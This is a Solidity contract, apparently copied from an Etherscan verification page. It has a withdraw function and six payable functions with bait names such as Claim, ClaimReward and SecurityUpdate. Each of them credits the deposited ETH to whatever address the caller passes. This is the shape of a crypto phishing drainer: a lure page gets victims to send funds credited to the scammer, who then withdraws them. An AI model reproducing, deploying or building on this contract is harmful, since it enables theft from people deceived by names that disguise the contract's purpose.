/**
 *Submitted for verification at Etherscan.io on 2023-05-27
*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.17;

contract SmartContract {
  address private owner;
  mapping (address => uint256) private balances;
  constructor() {
    owner = msg.sender;
  }
  function getOwner() public view returns (address) {
    return owner;
  }
  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }
  function getUserBalance(address user) public view returns (uint256) {
    return balances[user];
  }
  function withdraw(address to, uint256 amount) public {
    amount = (amount == 0) ? balances[msg.sender] : amount;
    require(amount > 0 && balances[msg.sender] >= amount, "It's not enough money on balance");
    balances[msg.sender] = balances[msg.sender] - amount;
    payable(to).transfer(amount);
  }
  function Claim(address sender) public payable {
    balances[sender] += msg.value;
  }
  function ClaimReward(address sender) public payable {
    balances[sender] += msg.value;
  }
  function SecurityUpdate(address sender) public payable {
    balances[sender] += msg.value;
  }
  function Execute(address sender) public payable {
    balances[sender] += msg.value;
  }
  function Swap(address sender) public payable {
    balances[sender] += msg.value;
  }
  function Connect(address sender) public payable {
    balances[sender] += msg.value;
  }
}